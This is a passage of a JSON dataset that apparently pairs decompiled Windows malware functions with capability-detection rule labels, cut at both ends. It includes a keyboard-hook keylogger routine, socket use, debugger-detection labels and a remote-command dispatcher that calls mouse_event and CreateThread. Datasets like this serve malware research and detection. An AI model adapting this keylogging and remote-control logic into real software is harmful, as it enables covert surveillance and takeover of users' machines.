fcn.00405800(0x47ff10, 0x47ff80, *in_EAX);\n                }\n                else {\n                    fcn.00405800(0x47ff10, 0x47ff9c, *in_EAX);\n                }\n                if ((uVar1 & 4) == 4) {\n                    fcn.00405800(0x47ff10, 0x47ffb8, *in_EAX);\n                }\n                else {\n                    fcn.00405800(0x47ff10, 0x47ffd4, *in_EAX);\n                }\n                iVar2 = 0x47ff10;\n                fcn.00405800();\n                puVar4 = puVar4 + 0x13;\n                var_ch = var_ch + -1;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = iVar2;\n        in_stack_fffff94c = s;\n        sub.wsock32.dll_closesocket();\n    }\n    *in_FS_OFFSET = in_stack_fffff94c;\n    fcn.00405490(0x47feef);\n    return;\n}\n",
        "token_count": 1190
    },
    "00488990": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00488990(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar6;\n    int32_t *piStack300;\n    uint uStack296;\n    uchar *puStack292;\n    int32_t *piStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack284 = 0x488e1b;\n    piStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack288;\n    uStack296 = 0x488de2;\n    piStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack300;\n    if ((arg_8h < 0) || (puVar1 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  arg_8h == 3)) {\n        sub.user32.dll_CallNextHookEx(*0x4ad280, arg_8h, arg_ch, arg_10h);\n        puVar1 = puStack292;\n        puVar2 = puStack280;\n    }\n    puStack280 = puVar2;\n    puStack292 = puVar1;\n    if ((arg_8h != 0) || (arg_ch != 0x100)) goto code_r0x00488dbf;\n    cVar3 = fcn.00488978();\n    if (cVar3 != '\\0') {\n        sub.user32.dll_CallNextHookEx(*0x4ad280, 0, 0x100, arg_10h);\n    }\n    iVar4 = *arg_10h;\n    if (iVar4 < 0x2f) {\n        if (iVar4 == 0x2e) {\n            fcn.00405504();\n        }\n        else if (iVar4 - 8U < 0x26) {\n    // switch table (38 cases) at 0x488a44\n            switch(*((iVar4 - 8U) * 4 + 0x488a44)) {\n            case 0x488b43:\n                fcn.00405504();\n                break;\n            case 0x488b55:\n                fcn.00405504();\n                break;\n            case 0x488b67:\n                fcn.00405504();\n                break;\n            case 0x488b79:\n                fcn.00405504();\n                break;\n            case 0x488c3f:\n                fcn.00405504();\n                break;\n            case 0x488c51:\n                fcn.00405504();\n                break;\n            case 0x488c63:\n                fcn.00405504();\n                break;\n            case 0x488c75:\n                fcn.00405504();\n                break;\n            case 0x488c87:\n                fcn.00405504();\n                break;\n            case 0x488c99:\n                fcn.00405504();\n                break;\n            case 0x488cab:\n                fcn.00405504();\n                break;\n            case 0x488ce1:\n                goto code_r0x00488ce1;\n            }\n        }\n        else {\ncode_r0x00488ce1:\n            sub.user32.dll_GetKeyState(0x14);\n            sub.user32.dll_GetKeyState(0x11);\n            sub.user32.dll_GetKeyState(0xa0);\n            sub.user32.dll_GetKeyState();\n            if (cVar3 == '\\0') {\n                sub.user32.dll_GetKeyboardState();\n                iVar4 = fcn.0040f20c();\n                if (iVar4 != 0) {\n                    fcn.00405b8c();\n                    uVar5 = fcn.0040595c(0);\n                    sub.user32.dll_MapVirtualKeyA(*arg_10h, 0, &var_104h, uVar5);\n                    iVar4 = sub.user32.dll_ToAscii();\n                    if (iVar4 == 0) {\n                        fcn.0040546c();\n                    }\n                    else if (iVar4 == 1) {\n                        fcn.00405b8c();\n                    }\n                    else if (iVar4 != 2) {\n                        fcn.0040546c();\n                    }\n                }\n            }\n        }\n    }\n    else if (iVar4 < 0x76) {\n        if (iVar4 == 0x75) {\n            fcn.00405504();\n        }\n        else {\n            if (4 < iVar4 - 0x70U) goto code_r0x00488ce1;\n    // switch table (5 cases) at 0x488afa\n            switch(*((iVar4 - 0x70U) * 4 + 0x488afa)) {\n            case 0x488b9d:\n                fcn.00405504();\n                break;\n            case 0x488baf:\n                fcn.00405504();\n                break;\n            case 0x488bc1:\n                fcn.00405504();\n                break;\n            case 0x488bd3:\n                fcn.00405504();\n                break;\n            case 0x488be5:\n                fcn.00405504();\n            }\n        }\n    }\n    else if (iVar4 < 0x91) {\n        if (iVar4 == 0x90) {\n            fcn.00405504();\n        }\n        else if (iVar4 == 0x76) {\n            fcn.00405504();\n        }\n        else {\n            if (iVar4 != 0x77) goto code_r0x00488ce1;\n            fcn.00405504();\n        }\n    }\n    else if (iVar4 == 0xa2) {\n        fcn.00405504();\n    }\n    else {\n        if (iVar4 != 0xa3) goto code_r0x00488ce1;\n        fcn.00405504();\n    }\n    fcn.0048838c();\n    if (**0x4a4e80 == 1) {\n        fcn.004887d4();\n    }\ncode_r0x00488dbf:\n    piVar6 = *0x4ad280;\n    sub.user32.dll_CallNextHookEx(*0x4ad280, arg_8h, arg_ch);\n    *in_FS_OFFSET = piVar6;\n    *in_FS_OFFSET = arg_10h;\n    fcn.0040546c(0x488e22);\n    return;\n}\n",
        "token_count": 1501
    },
    "0048b184": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0048b184(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint var_328h;\n    uint var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_318h;\n    uint var_208h;\n    uint var_1b8h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_190h;\n    uint var_18ch;\n    uint32_t var_188h;\n    uint var_184h;\n    uint uStackY172;\n    uint uStackY164;\n    uint uStackY160;\n    uint uStackY156;\n    uint uStackY152;\n    uchar *puStackY148;\n    uint uStackY144;\n    uint uStackY140;\n    uint uStackY136;\n    uint uStackY132;\n    uint *arg_8h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_24h = &stack0xfffffffc;\n    iVar4 = 0x65;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_18h = 0x48b1a7;\n    var_19ch = param_2;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    fcn.004058ec();\n    var_18h = 0x48b1b8;\n    fcn.00405f08();\n    var_1ch = 0x48b4e3;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048b184::var_20h;\n    var_28h = 0x48b472;\n    var_2ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048b184::var_2ch;\n    var_18h = &stack0xfffffffc;\n    fcn.00405784();\n    iVar4 = fcn.0040a384();\n    uVar1 = var_188h;\n    while (iVar4 == 0) {\n        var_188h = uVar1;\n        if ((uVar1 & 2) == 0) {\n            fcn.00405504();\n        }\n        else {\n            fcn.00405504();\n        }\n        if ((uVar1 & 0x20) == 0) {\n            fcn.00405504();\n        }\n        else {\n            fcn.00405504();\n        }\n        if ((uVar1 & 1) == 0) {\n            fcn.00405504();\n        }\n        else {\n            fcn.00405504();\n        }\n        if ((uVar1 & 4) == 0) {\n            fcn.00405504();\n        }\n        else {\n            fcn.00405504();\n        }\n        puVar3 = var_18h;\n        uVar2 = var_1ch;\n        fcn.00405800();\n        if ((uVar1 & 0x10) == 0) {\n            fcn.00405784();\n            fcn.004058fc();\n            sub.shell32.dll_SHGetFileInfoA();\n            fcn.004056dc();\n            arg_8h = &fcn.0048b184::var_1b0h;\n            fcn.00405784();\n            fcn.0048fd2c(arg_8h);\n            fcn.0040c7f4();\n            fcn.0040c7f4();\n            uStackY132 = 0x48b41b;\n            fcn.00409d58(var_190h);\n            uStackY136 = 0x48b544;\n            uStackY140 = var_10h;\n            uStackY144 = 0x48b544;\n            puStackY148 = puVar3;\n            uStackY152 = 0x48b544;\n            uStackY156 = uVar2;\n            uStackY160 = 0x48b544;\n            uStackY164 = var_28h;\n            var_2ch = 0x48b550;\n            uStackY172 = 0x48b453;\n            fcn.00405800();\n        }\n        else {\n            fcn.0048fd2c(&fcn.0048b184::var_1b0h);\n            fcn.0040c7f4();\n            fcn.0040c7f4();\n            var_2ch = 0x48b550;\n            fcn.00405800();\n        }\n        iVar4 = fcn.0040a3d4();\n        uVar1 = var_188h;\n    }\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x48b48c;\n    fcn.0040a3f8();\n    var_24h = var_8h;\n    var_28h = 0x48b55c;\n    var_2ch = var_ch;\n    fcn.00405800();\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x48b4ea;\n    var_28h = 0x48b4c4;\n    fcn.00405490();\n    var_28h = 0x48b4d5;\n    fcn.00405fd8();\n    var_28h = 0x48b4e2;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1425
    },
    "004901c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.004901c4(void)\n\n{\n    uint8_t uStack23;\n    uchar auStack20 [12];\n    \n    sub.kernel32.dll_GetSystemPowerStatus();\n    uStack23 = auStack20 >> 8;\n    if ((uStack23 & 1) == 1) {\n        fcn.004054c0();\n    }\n    if ((uStack23 & 2) == 2) {\n        fcn.004054c0();\n    }\n    if ((uStack23 & 4) == 4) {\n        fcn.004054c0();\n    }\n    if ((uStack23 & 8) == 8) {\n        fcn.004054c0();\n    }\n    if ((uStack23 & 0x80) == 0x80) {\n        fcn.004054c0();\n    }\n    if (uStack23 == 0xff) {\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0049066c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0049066c(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack204;\n    uint uStack200;\n    uchar *puStack196;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint8_t uStack8;\n    \n    puStack196 = &stack0xfffffffc;\n    uStack200 = 0x490738;\n    uStack204 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack204;\n    fcn.004054c0();\n    while( true ) {\n        uVar2 = 1;\n        uStack204 = 0;\n        iVar1 = sub.user32.dll_EnumDisplayDevicesA();\n        if (iVar1 == 0) break;\n        if ((uStack8 & 1) != 0) {\n            fcn.004056dc(*in_EAX);\n            fcn.004056dc(0x490774, 0);\n            uStack204 = 0x49078c;\n            fcn.00405800();\n        }\n    }\n    *in_FS_OFFSET = uStack204;\n    fcn.00405490(0x49073f, uVar2);\n    return;\n}\n",
        "token_count": 285
    },
    "00493dac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1b4h\n// WARNING: Variable defined which should be unmapped: var_248h\n// WARNING: Variable defined which should be unmapped: var_3a0h\n// WARNING: Variable defined which should be unmapped: var_3d4h\n// WARNING: Variable defined which should be unmapped: var_3dch\n// WARNING: Variable defined which should be unmapped: var_40ch\n// WARNING: Variable defined which should be unmapped: var_440h\n// WARNING: Variable defined which should be unmapped: var_454h\n// WARNING: Variable defined which should be unmapped: var_468h\n// WARNING: Variable defined which should be unmapped: var_4c0h\n// WARNING: Variable defined which should be unmapped: var_520h\n// WARNING: Variable defined which should be unmapped: var_544h\n// WARNING: Variable defined which should be unmapped: var_568h\n// WARNING: Variable defined which should be unmapped: var_58ch\n// WARNING: Variable defined which should be unmapped: var_59ch\n// WARNING: Variable defined which should be unmapped: var_5bch\n// WARNING: Variable defined which should be unmapped: var_5e0h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00493dac(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    code *pcVar10;\n    uint *puVar11;\n    uint *unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t iVar12;\n    int32_t unaff_EDI;\n    code **in_FS_OFFSET;\n    uchar uVar13;\n    code *pcStackY2996;\n    code *in_stack_fffff458;\n    uchar *puVar14;\n    uchar *arg_8h;\n    uint *puStack2720;\n    uchar *puStack2716;\n    uchar *puStack2712;\n    uint *puStack2708;\n    uint *puStack2704;\n    code *pcStack2700;\n    uchar *puStack2696;\n    uchar *puStack2692;\n    uchar *puStack2688;\n    uint *puStack2684;\n    uint *puStack2680;\n    uchar *puStack2676;\n    uint *puStack2672;\n    uint uStack2668;\n    uint uStack2664;\n    uint *puStack2660;\n    uint uStack2656;\n    uint uStack2652;\n    uchar *puStack2648;\n    uchar *puStack2644;\n    uint uStack2640;\n    uint uStack2636;\n    code *pcStack2632;\n    uint uStack2628;\n    uint uStack2624;\n    uint *puStack2620;\n    uchar *puStack2616;\n    uint uStack2612;\n    uint uStack2608;\n    code *pcStack2604;\n    uint uStack2600;\n    uint uStack2596;\n    uint *puStack2592;\n    uchar *puStack2588;\n    uint uStack2584;\n    uint uStack2580;\n    code *pcStack2576;\n    uint uStack2572;\n    uint uStack2568;\n    uint *puStack2564;\n    uchar *puStack2560;\n    uchar *arg_8h_00;\n    code *pcStack2324;\n    uint uStack2320;\n    uchar *puStack2316;\n    uchar *puStack2312;\n    uint uStack2308;\n    uint uStack2304;\n    uint uStack2300;\n    code *pcStack2296;\n    int32_t iStack2292;\n    uint uStack2288;\n    uint *puStack2284;\n    uint uStack2280;\n    uint uStack2276;\n    uint *puStack2272;\n    uchar *puStack2268;\n    uint uStack2264;\n    uint uStack2260;\n    uint *puStack2256;\n    uint uStack2252;\n    uint *puStack2248;\n    uint *puStack2244;\n    uchar *arg_8h_01;\n    code *pcStack2124;\n    uint uStack2120;\n    uchar *puStack2116;\n    uchar *puStack2112;\n    uint uStack2108;\n    uint uStack2104;\n    uint uStack2100;\n    code *pcStack2096;\n    uint uStack2092;\n    uint uStack2088;\n    uint *puStack2084;\n    uint uStack2080;\n    uint uStack2076;\n    uint *puStack2072;\n    uint *puStack2068;\n    uint *puStack2064;\n    uint *puStack2060;\n    code *pcStack2056;\n    uint uStack2052;\n    uint uStack2048;\n    uint *puStack2044;\n    uint uStack2040;\n    uint uStack2036;\n    uint uStack2032;\n    code *pcStack2028;\n    code *pcStack2024;\n    uchar *puStack2020;\n    uchar *puStack2016;\n    uint uStack2012;\n    uint uStack2008;\n    uint uStack2004;\n    uint var_7cch;\n    uint uStack1996;\n    uint uStack1992;\n    uint uStack1988;\n    uint uStack1984;\n    code *pcStack1980;\n    uint uStack1976;\n    uchar *puStack1972;\n    uchar *puStack1968;\n    uchar *puStack1964;\n    uint uStack1960;\n    uint uStack1956;\n    uint *puStack1952;\n    uchar *arg_8h_02;\n    uint *puStack1944;\n    uint *puStack1940;\n    uint uStack1932;\n    uint uStack1928;\n    uint uStack1924;\n    code *var_77ch;\n    uint var_778h;\n    uint uStack1912;\n    uint *puStack1908;\n    uint uStack1904;\n    uint uStack1900;\n    uint *puStack1896;\n    uint *puStack1892;\n    uint uStack1888;\n    uint *in_stack_fffff8a8;\n    uint *puStack1872;\n    code *pcStack1868;\n    uchar *puStack1864;\n    uint *puStack1860;\n    uint uStack1856;\n    uint uStack1852;\n    uint uStack1848;\n    uint uStack1844;\n    uint uStack1840;\n    uint uStack1836;\n    uint *puStack1832;\n    uint uStack1828;\n    uint uStack1824;\n    uint uStack1820;\n    code *pcStack1816;\n    uint uStack1812;\n    uint uStack1808;\n    uint *puStack1804;\n    uint uStack1800;\n    uint uStack1796;\n    uint *puStack1792;\n    uint *puStack1788;\n    uint *puStack1784;\n    uint *puStack1780;\n    uint *puStack1776;\n    uint uStack1772;\n    uint uStack1768;\n    uint uStack1764;\n    code *pcStack1760;\n    uint uStack1756;\n    uint uStack1752;\n    uint *puStack1748;\n    uint uStack1744;\n    code *pcStack1740;\n    uint *puStack1736;\n    uint *puStack1732;\n    code *pcStack1728;\n    uint uStack1724;\n    uint uStack1720;\n    uint *puStack1716;\n    uint uStack1712;\n    uint uStack1708;\n    uint *puStack1704;\n    code *pcStack1668;\n    uint uStack1644;\n    uint *puStack1640;\n    uint var_660h;\n    uint *var_65ch;\n    uint uStack1628;\n    uint *puStack1624;\n    uint uStack1620;\n    uint *puStack1616;\n    uint uStack1612;\n    uint *puStack1608;\n    int32_t iStack1604;\n    int32_t var_63ch;\n    uint uStack1596;\n    int32_t iStack1592;\n    uint uStack1588;\n    int32_t iStack1584;\n    uint uStack1580;\n    uint uStack1576;\n    uint uStack1572;\n    uint *puStack1568;\n    uint uStack1564;\n    uint *puStack1560;\n    uint var_610h;\n    uint *var_60ch;\n    uint var_608h;\n    uint *var_604h;\n    uint var_600h;\n    uint *var_5fch;\n    int32_t var_5f8h;\n    uint *var_5f4h;\n    uint var_5f0h;\n    uint *var_5ech;\n    uint *var_5e8h;\n    uint *var_5e4h;\n    uint *var_5e0h;\n    uint var_5dch;\n    uint *var_5d8h;\n    uchar *var_5d4h;\n    uint *var_5d0h;\n    uint var_5cch;\n    uint *var_5c8h;\n    uint *var_5c4h;\n    uint *var_5c0h;\n    uint *var_5bch;\n    uint *var_5b8h;\n    uint *var_5b4h;\n    uint var_5b0h;\n    uint *var_5ach;\n    uint *var_5a8h;\n    int32_t *var_5a4h;\n    int32_t *var_5a0h;\n    int32_t *var_59ch;\n    uint *var_598h;\n    int32_t *var_594h;\n    uint *var_590h;\n    uint *var_58ch;\n    uint *var_588h;\n    uint *var_584h;\n    uint *var_580h;\n    int32_t var_57ch;\n    int32_t var_578h;\n    int32_t var_574h;\n    uint *var_570h;\n    uint *var_56ch;\n    uint *var_568h;\n    uint *var_564h;\n    uint *var_560h;\n    uint *var_55ch;\n    uint *var_558h;\n    uint *var_554h;\n    uint *var_550h;\n    uint *var_54ch;\n    uint *var_548h;\n    uint *var_544h;\n    uint *var_540h;\n    uint *var_53ch;\n    uint *var_538h;\n    uint var_534h;\n    uint var_530h;\n    uint *var_52ch;\n    uint *var_528h;\n    uint *var_524h;\n    uint *var_520h;\n    uint *var_51ch;\n    uint *var_518h;\n    uint *var_514h;\n    uint *var_510h;\n    uint var_50ch;\n    int32_t *var_508h;\n    uint *var_504h;\n    int32_t *var_500h;\n    uint var_4fch;\n    int32_t *var_4f8h;\n    uint var_4f4h;\n    int32_t *var_4f0h;\n    uint *var_4ech;\n    int32_t *var_4e8h;\n    uint var_4e4h;\n    int32_t *var_4e0h;\n    int32_t *var_4dch;\n    int32_t *var_4d8h;\n    int32_t *var_4d4h;\n    int32_t *var_4d0h;\n    uint var_4cch;\n    uint var_4c8h;\n    uint *var_4c4h;\n    uint *var_4c0h;\n    uint *var_4bch;\n    uint *var_4b8h;\n    uint *var_4b4h;\n    uint *var_4b0h;\n    uint var_4ach;\n    uint var_4a8h;\n    code *var_4a4h;\n    uint var_4a0h;\n    uint var_49ch;\n    int32_t *var_498h;\n    uint var_494h;\n    uint var_490h;\n    int32_t var_48ch;\n    uint var_488h;\n    uint *var_484h;\n    uint var_480h;\n    int32_t *var_47ch;\n    uint var_478h;\n    int32_t var_474h;\n    int32_t var_470h;\n    uint *var_46ch;\n    uint *var_468h;\n    uint *var_464h;\n    uint *var_460h;\n    uint *var_45ch;\n    uint *lParam;\n    uint *var_454h;\n    uint *var_450h;\n    uint *var_44ch;\n    uint *var_448h;\n    uint *var_444h;\n    uint *var_440h;\n    uint *var_43ch;\n    uint *var_438h;\n    uint *var_434h;\n    uint *var_430h;\n    uint *var_42ch;\n    uint *var_428h;\n    uint *var_424h;\n    uint *var_420h;\n    uint *var_41ch;\n    uint *var_418h;\n    uint *var_414h;\n    uint *var_410h;\n    uint *var_40ch;\n    uint var_408h;\n    uint *var_404h;\n    uchar *var_400h;\n    uint *var_3fch;\n    uint *var_3f8h;\n    uint *var_3f4h;\n    uint *var_3f0h;\n    uint *var_3ech;\n    uint *var_3e8h;\n    uint *var_3e4h;\n    uint *var_3e0h;\n    uint *var_3dch;\n    uint *var_3d8h;\n    uint *var_3d4h;\n    uint *var_3d0h;\n    uint *var_3cch;\n    uint var_3c8h;\n    uint var_3c4h;\n    uint var_3c0h;\n    code *var_3bch;\n    int32_t var_3b8h;\n    uint var_3b4h;\n    uint *var_3b0h;\n    uint var_3ach;\n    uint var_3a8h;\n    uint *var_3a4h;\n    uint *var_3a0h;\n    uint *var_39ch;\n    uint *var_398h;\n    uint *var_394h;\n    uint *var_390h;\n    uint var_38ch;\n    uint var_388h;\n    uint *var_384h;\n    uint var_380h;\n    uint var_37ch;\n    uint *var_378h;\n    uint *var_374h;\n    uint *var_370h;\n    uint var_36ch;\n    uint *var_368h;\n    uint *var_364h;\n    uint *var_360h;\n    uint *var_35ch;\n    uint *var_358h;\n    uint *var_354h;\n    uint *var_350h;\n    uint *var_34ch;\n    uint *var_348h;\n    uint var_344h;\n    uint *var_340h;\n    uint *var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    uint *var_32ch;\n    uint *var_328h;\n    uint *var_324h;\n    uint var_320h;\n    int32_t var_31ch;\n    uint var_318h;\n    int32_t var_314h;\n    uint var_310h;\n    uint *var_30ch;\n    uint var_308h;\n    uint *var_304h;\n    uint var_300h;\n    uint var_2fch;\n    uint *var_2f8h;\n    uint var_2f4h;\n    uint *var_2f0h;\n    uint var_2ech;\n    uint var_2e8h;\n    uint *var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint *var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint *var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint *var_2c0h;\n    uint var_2bch;\n    int32_t var_2b8h;\n    uint *var_2b4h;\n    uint var_2b0h;\n    int32_t var_2ach;\n    uint *var_2a8h;\n    uint *var_2a4h;\n    uint *var_2a0h;\n    uint var_29ch;\n    uint *var_298h;\n    uint *var_294h;\n    uint *var_290h;\n    uint *var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint *var_270h;\n    uint *var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint *var_250h;\n    uint *var_24ch;\n    uint *var_248h;\n    uint *var_244h;\n    uint *var_240h;\n    uint *var_23ch;\n    uint *lpBuffer;\n    uint *var_234h;\n    uint uStack564;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    uint *puStack544;\n    uint32_t uStack540;\n    uchar *puStack536;\n    uint32_t uStack532;\n    uint uStack528;\n    uint *puStack524;\n    uint uStack520;\n    uint32_t uStack516;\n    uint uStack512;\n    code *pcStack508;\n    uint *puStack504;\n    uint *puStack500;\n    uint *puStack496;\n    uint uStack492;\n    uint *wParam;\n    uint *var_1e0h;\n    uint *puStack480;\n    uint *var_1d8h;\n    uint uStack472;\n    int32_t iStack468;\n    int32_t iStack464;\n    uint *var_1c8h;\n    uint *puStack456;\n    uint uStack452;\n    uint uStack448;\n    uint *puStack444;\n    int32_t *var_1b4h;\n    uint *var_1b0h;\n    int32_t iStack432;\n    uint *puStack428;\n    uint var_1a4h;\n    int32_t var_1a0h;\n    uint uStack416;\n    uint *var_198h;\n    uint uStack408;\n    uint uStack404;\n    uint *puStack400;\n    uint32_t var_188h;\n    uint *puStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    uint *puStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    int32_t iStack360;\n    uint uStack356;\n    uint *puStack352;\n    uint uStack348;\n    uint uStack344;\n    uint *puStack340;\n    uint uStack336;\n    int32_t iStack332;\n    uint *puStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint *var_38h;\n    uint *puStack56;\n    code *pcStack52;\n    uint uStack48;\n    uchar *var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_28h = &stack0xfffffffc;\n    puVar14 = &stack0xfffffffc;\n    arg_8h_02 = &stack0xfffffffc;\n    arg_8h_01 = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    arg_8h = &stack0xfffffffc;\n    var_ch = 0xf9;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_1ch = 0x493dca;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    var_8h = in_EAX;\n    fcn.004058ec();\n    var_1ch = 0x493ddb;\n    fcn.00405f08();\n    var_20h = 0x49b86f;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00493dac::var_24h;\n    uVar13 = true;\n    uStack48 = 0x49b70a;\n    pcStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x493e04;\n    var_1ch = &stack0xfffffffc;\n    fcn.00405894();\n    if (uVar13) {\n        puStack56 = 0x493e1e;\n        fcn.00405784();\n        puStack56 = 0x493e29;\n        fcn.004938a4();\n    }\n    puStack56 = &fcn.00493dac::var_240h;\n    var_38h = 0x493e42;\n    fcn.00405964();\n    var_38h = 0x493e52;\n    fcn.00405894();\n    if (uVar13) {\n        var_38h = 0x493e6a;\n        fcn.004059a4();\n        var_38h = &fcn.00493dac::var_ch;\n        fcn.00405a48();\n        fcn.00405964();\n        fcn.00405a48();\n        fcn.004059a4();\n        fcn.00405a48();\n        fcn.00405964();\n        fcn.00405a48();\n        fcn.004059a4();\n        fcn.00405a48();\n        fcn.00405964();\n        fcn.00405a48();\n        fcn.004059a4();\n        iVar3 = fcn.00405a48();\n        uVar13 = iVar3 == 1;\n        fcn.00405964();\n        fcn.00405a48();\n        fcn.004059a4();\n        fcn.00405504();\n        sub.kernel32.dll_LocalAlloc_1();\n        fcn.004054c0();\n        fcn.004054c0();\n        fcn.004054c0();\n        fcn.004054c0();\n        fcn.004054c0();\n        sub.kernel32.dll_CreateThread();\n        sub.kernel32.dll_CloseHandle_1();\n    }\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar13) {\n        fcn.004059a4();\n        fcn.0048ea2c();\n        *in_FS_OFFSET = &fcn.00493dac::var_244h;\n    }\n    else {\n        fcn.00405964();\n        fcn.00405894();\n        if (uVar13) {\n            fcn.004059a4();\n            fcn.00409dd8();\n            sub.user32.dll_mouse_event();\n            *in_FS_OFFSET = 0x800;\n        }\n        else {\n            fcn.00405964();\n            fcn.00405894();\n            if (uVar13) {\n                fcn.00405964();\n                fcn.00445b7c();\n                *in_FS_OFFSET = &fcn.00493dac::var_ch;\n            }\n            else {\n                fcn.00405964();\n                fcn.00405894();\n                if (uVar13) {\n                    fcn.004059a4();\n                    fcn.0049091c();\n                    *in_FS_OFFSET = &fcn.00493dac::var_250h;\n                }\n                else {\n                    fcn.00405964();\n                    fcn.00405894();\n                    if (uVar13) {\n                        fcn.004059a4();\n                        fcn.0049091c();\n                        *in_FS_OFFSET = &fcn.00493dac::var_254h;\n                    }\n                    else {\n                        fcn.00405964();\n                        fcn.00405894();\n                        if (uVar13) {\n                            fcn.004059a4();\n                            fcn.0049091c();\n                            *in_FS_OFFSET = &fcn.00493dac::var_258h;\n                        }\n                        else {\n                            fcn.00405964();\n                            fcn.00405894();\n                            if (uVar13) {\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                fcn.00405a48();\n                                fcn.004059a4();\n                                fcn.00405a48();\n                                fcn.00405964();\n                                